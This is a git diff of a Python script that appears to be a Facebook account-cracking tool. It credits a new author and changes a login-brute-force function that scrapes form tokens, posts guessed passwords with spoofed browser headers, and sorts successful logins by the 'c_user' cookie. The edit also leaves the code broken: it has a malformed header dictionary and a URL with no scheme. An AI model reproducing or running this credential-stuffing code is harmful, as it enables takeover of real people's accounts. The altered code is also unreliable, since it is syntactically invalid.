@@ -87,7 +87,7 @@ logo = ("""
 | $$$$$$$/| $$  | $$    | $$   |  $$$$$$/ /$$$$$$| $$$$$$$/
 |_______/ |__/  |__/    |__/    \______/ |______/|_______/ 
 [+]==============================================
-[+] CREATED BY   :  ANONYMOUS U7P4L
+[+] CREATED BY   : BAYGID
 [+] COUNTRY      :  BANGLADESH 
 [+] ON GITHUB    :  BAYGID
 [+] TOOL STATUS  :  RANDOM
@@ -224,7 +224,7 @@ def rcrack1(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write('\r[\033[1;92mSAMIR\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('mbasic.facebook.com',).text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -239,18 +239,22 @@ def rcrack1(uid,pwx,tl):
             "method": 'GET',
             "scheme": 'https',
             'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"macOS"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+    : pro}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
